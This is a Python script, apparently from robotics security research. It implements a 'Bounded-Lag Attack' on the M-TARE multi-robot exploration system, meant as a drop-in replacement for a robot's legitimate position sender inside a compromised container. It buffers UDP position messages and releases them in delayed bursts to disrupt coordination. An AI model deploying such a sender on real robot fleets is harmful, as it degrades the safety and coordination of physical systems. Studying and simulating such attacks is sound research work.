#!/usr/bin/env python3
"""
Bounded-Lag Attack sender for M-TARE.

Drop-in replacement for mtare_position_sender.py.
Deploy this inside a compromised robot container instead of the original sender.

Usage (inside robot container):
    python3 bla_sender.py <robot_id> <target_ip> <target_port> [lambda_secs]

Accumulates UDP packets over a window of lambda_secs, then releases them
all at once as a burst. Simulates BLA as described in the paper.
"""

import json
import socket
import sys
import time
import threading
from collections import deque

try:
    import rospy
    from geometry_msgs.msg import PointStamped
    from std_msgs.msg import Bool
    ROS_AVAILABLE = True
except ImportError:
    ROS_AVAILABLE = False
    print("[bla_sender] WARNING: rospy not found. Running in stub mode.", flush=True)


# ── Attack buffer ────────────────────────────────────────────────────────────

class BDABuffer:
    """Accumulates packets for lambda_secs then releases them all at once."""

    def __init__(self, lambda_secs: float, sock: socket.socket, target,
                 max_buffer: int = 50):
        self.lambda_secs = lambda_secs
        self.sock = sock
        self.target = target
        self.max_buffer = max_buffer
        self._buffer = deque()
        self._lock = threading.Lock()
        self._t_first = None
        self._burst_count = 0
        self._thread = threading.Thread(target=self._burst_loop, daemon=True)
        self._thread.start()

    def push(self, data: bytes, generated_at: float):
        with self._lock:
            self._buffer.append((data, generated_at))
            if self._t_first is None:
                self._t_first = time.time()
            if len(self._buffer) >= self.max_buffer:
                self._do_burst()

    def _burst_loop(self):
        while True:
            with self._lock:
                if (
                    self._buffer
                    and self._t_first is not None
                    and (time.time() - self._t_first) >= self.lambda_secs
                ):
                    self._do_burst()
            time.sleep(0.1)

    def _do_burst(self):
        """Release all buffered packets. Must be called under self._lock."""
        if not self._buffer:
            return
        burst_size = len(self._buffer)
        burst_time = time.time()
        while self._buffer:
            data, generated_at = self._buffer.popleft()
            delay = burst_time - generated_at
            self.sock.sendto(data, self.target)
        self._t_first = None
        self._burst_count += 1
        print(
            f"[BLA] burst #{self._burst_count}: released {burst_size} packets",
            flush=True,
        )


# ── ROS sender ───────────────────────────────────────────────────────────────

class BDASender:
    def __init__(self):
        args = rospy.myargv(argv=sys.argv) if ROS_AVAILABLE else sys.argv
        if len(args) < 4:
            print("Usage: bla_sender.py <robot_id> <target_ip> <target_port> [lambda_secs]")
            sys.exit(1)

        self.robot_id = int(args[1])
        self.target_ip = args[2]
        self.target_port = int(args[3])
        self.lambda_secs = float(args[4]) if len(args) > 4 else 3.0

        self.relay_comms = False
        self.count_received = 0

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.buffer = BDABuffer(
            lambda_secs=self.lambda_secs,
            sock=self.sock,
            target=(self.target_ip, self.target_port),
        )

        print(f"[BLA sender robot{self.robot_id}] started", flush=True)
        print(f"[BLA sender robot{self.robot_id}] lambda={self.lambda_secs}s", flush=True)
        print(f"[BLA sender robot{self.robot_id}] target={self.target_ip}:{self.target_port}", flush=True)

        if ROS_AVAILABLE:
            rospy.init_node(f"bla_position_sender_{self.robot_id}", anonymous=False)
            rospy.Subscriber(
                f"/wheeled{self.robot_id}/position",
                PointStamped,
                self.position_callback,
                queue_size=1,
            )
            rospy.Subscriber(
                "/sensor_coverage_planner/relay_comms",
                Bool,
                self.relay_comms_callback,
                queue_size=1,
            )

    def relay_comms_callback(self, msg):
        self.relay_comms = msg.data

    def position_callback(self, msg):
        self.count_received += 1
        payload = {
            "robot_id":    self.robot_id,
            "x":           msg.point.x,
            "y":           msg.point.y,
            "z":           msg.point.z,
            "relay_comms": self.relay_comms,
            "stamp":       time.time(),
            "seq":         self.count_received,
            "attack":      "bla",
        }
        data = json.dumps(payload).encode("utf-8")
        self.buffer.push(data, generated_at=time.time())

    def spin(self):
        if ROS_AVAILABLE:
            rospy.spin()
        else:
            while True:
                time.sleep(1)


if __name__ == "__main__":
    BDASender().spin()
